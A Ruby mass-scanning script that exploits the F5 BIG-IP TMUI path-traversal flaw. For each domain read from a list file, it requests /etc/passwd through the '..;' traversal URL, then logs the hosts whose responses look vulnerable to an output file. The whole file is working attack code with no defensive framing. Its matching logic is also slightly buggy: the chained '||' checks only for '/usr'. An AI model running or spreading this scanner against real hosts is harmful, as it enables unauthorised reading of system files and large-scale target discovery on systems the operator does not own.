require 'httparty'
require 'colorize'
require 'timeout'

if ARGV.empty?
    puts "Usage : ruby #{__FILE__} list01.txt output.txt"
    exit
end

list = File.open("#{ARGV[0]}").read
data = list.split("\n")

threads = []
data.each do |domain|
    threads = []
    begin
            status = Timeout::timeout(2){
            request = HTTParty.get(domain+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", follow_redirects: false)
            puts

            if request.body.include?('/usr' || '/nologin' || '/sbin')
                puts "[+] => Vulnerable #{domain}".colorize(:yellow)
                File.open("#{ARGV[1]}","a+"){|file|file.write("#{domain}\n")}
                puts "File Saved => #{Dir.pwd}/#{ARGV[1]}".yellow
            else !request.body.include?('/usr' || '/nologin' || '/sbin')
                puts '[-] => Not Vulnerable'.colorize(:red)
            end
    }
    rescue OpenSSL::SSL::SSLError
        puts
        puts "[-] => SSL Error...".red
    rescue Errno::ECONNREFUSED
        puts
        puts "[-] => Connection Refused!".red 
    rescue Timeout::Error
        puts
        puts "[-] => Time Out...".red
    rescue Errno::ECONNRESET
        puts
        puts "[-] => Connection Reset...".red
    rescue Interrupt
        puts "Leaving The Program"
        exit
    end
end